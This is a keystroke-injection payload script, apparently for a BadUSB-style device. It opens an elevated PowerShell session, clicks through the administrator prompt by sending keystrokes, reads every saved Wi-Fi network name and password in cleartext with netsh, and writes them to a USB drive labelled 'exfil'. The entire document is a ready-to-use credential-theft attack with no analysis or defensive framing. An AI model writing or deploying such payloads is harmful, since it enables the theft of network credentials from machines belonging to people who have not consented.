layout('us');
press("GUI");
delay(1500);
type("powershell");
delay(1500);
press("CTRL SHIFT ENTER");
delay(2000)
press("TAB");
delay(100);
press("TAB");
press("ENTER");
delay(2000);
type('$exfilDrive = Get-Volume | Where-Object { $_.FileSystemLabel -eq "exfil" } | Select-Object -First 1')
press("ENTER")
delay(5000)
type('$backupFile = "$($exfilDrive.DriveLetter):\WiFi_Backup.txt"')
press("ENTER")
delay(500)
type('$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {($_ -split ":")[1].Trim()}')
press("ENTER")
delay(500)
type('$wifiData = $profiles | ForEach-Object { $details = netsh wlan show profile name="$_" key=clear; $passwordLine = $details | Select-String "Key Content"; $password = if ($passwordLine) { ($passwordLine -split ":")[1].Trim() } else { "N/A" }; "SSID: $_`nPassword: $password`n" }')
press("ENTER")
delay(500)
type('$wifiData | Out-File -FilePath $backupFile -Encoding UTF8')
press("ENTER")
delay(500)
type('Write-Host "✅ Wi-Fi credentials saved to $backupFile"')
delay(200);
press("ENTER");
delay(3000)
type("exit")
press("ENTER")

  

